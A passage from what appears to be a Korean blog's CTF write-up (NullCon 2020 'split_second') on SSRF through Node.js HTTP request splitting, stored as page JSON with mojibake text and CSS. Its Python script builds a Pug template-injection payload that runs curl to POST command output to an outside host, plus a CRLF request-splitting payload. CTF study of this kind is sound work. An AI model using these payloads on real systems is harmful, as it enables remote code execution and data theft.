class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">else</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk1\">+=</span><span class=\"mtk4\">i</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">r</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">SPACE</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;Ä &quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">CRLF</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;ÄÄŠ&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">SLASH</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;Ä¯&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">pug</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">changeOct</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;&#39;&#39;-[][&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(this.process.mainModule.require(&#39;</span><span class=\"mtk4\">child_process</span><span class=\"mtk6\">&#39;).exec(&#39;</span><span class=\"mtk4\">curl</span><span class=\"mtk1\"> </span><span class=\"mtk4\">http</span><span class=\"mtk1\">:</span><span class=\"mtk5 mtki\">//devjs.cf:8089/cookie.php -X POST -d c=`ls | grep flag` &#39;))&quot;)()&#39;&#39;&#39;).replace(&#39;&quot;&#39;,&#39;%22&#39;).replace(&quot;&#39;&quot;,&quot;%27&quot;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">print</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">quote</span><span class=\"mtk1\">(</span><span class=\"mtk4\">pug</span><span class=\"mtk1\">)) #</span><span class=\"mtk4\">url</span><span class=\"mtk1\">-</span><span class=\"mtk4\">encoding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">payload</span><span class=\"mtk1\"> = </span><span class=\"mtk6\">&quot;test&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;HTTP&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SLASH</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;1.1&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk7\">*</span><span class=\"mtk1\">2+</span><span class=\"mtk6\">&quot;GET&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SLASH</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;flag&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;HTTP&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SLASH</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;1.1&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;HOST:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;127.0.0.1&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;adminauth:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;secretpassword&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;pug:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span><span class=\"mtk1\">+</span><span class=\"mtk4\">pug</span><span class=\"mtk1\">+</span><span class=\"mtk4\">CRLF</span><span class=\"mtk1\">+</span><span class=\"mtk6\">&quot;test:&quot;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">SPACE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">res</span><span class=\"mtk1\">=</span><span class=\"mtk4\">requests</span><span class=\"mtk1\">.</span><span class=\"mtk4\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;http://devjs.cf:8081/core?q=&#39;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">quote</span><span class=\"mtk1\">(</span><span class=\"mtk4\">payload</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">print</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">res</span><span class=\"mtk1\">.</span><span class=\"mtk4\">url</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>ì´ì œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•´ì„œ flag ë¬¸ìì—´ì´ í¬í•¨í•œ ê²°ê³¼ ê°’ì´ ìˆëŠ”ì§€ í™•ì¸ í•©ë‹ˆë‹¤.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 638px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.666666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAcklEQVQI13WNQQ7DMAgE84uq2HGcXGpjgQ1YeUD//6iS3Fqpc1ihRaNdmBkRe+9mc5rVWszMS2J+leovVW3Y/ACA+M0yxiCiPeftJqV057bndGR4QnAnXPFrXrKp+axPiaiKlFJEBjY6rb3nA0Jc1/iPD4pyGWhAh1YHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Er41R6tyvAyUaNZT2WhH20img\"\n        title=\"Er41R6tyvAyUaNZT2WhH20img\"\n        src=\"/static/2436df13d1bbfd0dd4dffaf3c71711f0/41be6/Er41R6tyvAyUaNZT2WhH20img.png\"\n        srcset=\"/static/2436df13d1bbfd0dd4dffaf3c71711f0/5a46d/Er41R6tyvAyUaNZT2WhH20img.png 300w,\n/static/2436df13d1bbfd0dd4dffaf3c71711f0/0a47e/Er41R6tyvAyUaNZT2WhH20img.png 600w,\n/static/2436df13d1bbfd0dd4dffaf3c71711f0/41be6/Er41R6tyvAyUaNZT2WhH20img.png 638w\"\n        sizes=\"(max-width: 638px) 100vw, 638px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>flag.txt íŒŒì¼ì´ í˜„ì¬ ê²½ë¡œì— ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>\n<p>ì´ì œ ì¶œë ¥ í•´ë´…ë‹ˆë‹¤.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 727px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAs0lEQVQY03WPzQ6CMBCEeQ4ptpYK/QGqQcBua4Ix4cD7P5CDJ436HTZzmdmZbF3XEEIEKd3neZqmlFKkeA3XcRyJKBL1fe+ca94QQuSMZSFQ2zZ1XXPOS1nuAedig0PiQhVFsfuEvcgCEVKNMVVVWWOVUlpraCmVlGW9AS3zPGdfZMuy3FJEW5Tx3iOlcU5rc+504yxSEPfTuZmxEJ8738E5DBdr7cl76/yDlDliwgFz2B+eWOsuKa61828AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"oWnMozHLDHITWjr7H56NrKimg\"\n        title=\"oWnMozHLDHITWjr7H56NrKimg\"\n        src=\"/static/e9ba7091c19c7db722e62b6e704b9117/c54b3/oWnMozHLDHITWjr7H56NrKimg.png\"\n        srcset=\"/static/e9ba7091c19c7db722e62b6e704b9117/5a46d/oWnMozHLDHITWjr7H56NrKimg.png 300w,\n/static/e9ba7091c19c7db722e62b6e704b9117/0a47e/oWnMozHLDHITWjr7H56NrKimg.png 600w,\n/static/e9ba7091c19c7db722e62b6e704b9117/c54b3/oWnMozHLDHITWjr7H56NrKimg.png 727w\"\n        sizes=\"(max-width: 727px) 100vw, 727px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<blockquote>\n<p>FLAG : hackim20{You<em>must</em>be<em>1337</em>in_JavaScript!}</p>\n</blockquote>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .one-dark-pro {\n    background-color: #282c34;\n    color: #abb2bf;\n  }\n  .one-dark-pro .mtki { font-style: italic; }\n  .one-dark-pro .mtk5 { color: #7F848E; }\n  .one-dark-pro .mtk10 { color: #C678DD; }\n  .one-dark-pro .mtk1 { color: #ABB2BF; }\n  .one-dark-pro .mtk4 { color: #E06C75; }\n  .one-dark-pro .mtk8 { color: #56B6C2; }\n  .one-dark-pro .mtk6 { color: #98C379; }\n  .one-dark-pro .mtk3 { color: #61AFEF; }\n  .one-dark-pro .mtk11 { color: #E5C07B; }\n  .one-dark-pro .mtk7 { color: #D19A66; }\n  .one-dark-pro .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>","tableOfContents":"<ul>\n<li><a href=\"/Security/nodejs-HTTP-request-splitting%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-SSRF-%EC%B7%A8%EC%95%BD%EC%A0%90featNullCon2020-splitsecond-WriteUp/#--writeup\">- WriteUp</a></li>\n</ul>","frontmatter":{"date":"2020ë…„ 03ì›” 01ì¼","title":"[node.js] : HTTP request splittingì„ ì´ìš©í•œ SSRF ì·¨ì•½ì (feat.NullCon_2020-split_second WriteUp)","tags":["SSRF","CVE"]}}},"pageContext":{"slug":"/Security/nodejs-HTTP-request-splittingì„-ì´ìš©í•œ-SSRF-ì·¨ì•½ì featNullCon2020-splitsecond-WriteUp/","previous":{"fields":{"slug":"/Writeup/CodeGate-writeup-csp_web/"},"frontmatter":{"title":"CodeGate - writeUp - csp(web)"}},"next":{"fields":{"slug":"/React/React-JS-ê³µì -ë§ˆìŠ¤í¬ë§µ-ê°œë°œ-í›„ê¸°feat-Kakaomap/"},"frontmatter":{"title":"[React JS] - ê³µì  ë§ˆìŠ¤í¬ë§µ ê°œë°œ í›„ê¸°(feat. Kakaomap)"}}}},"staticQueryHashes":["1081905842","3911196313"]}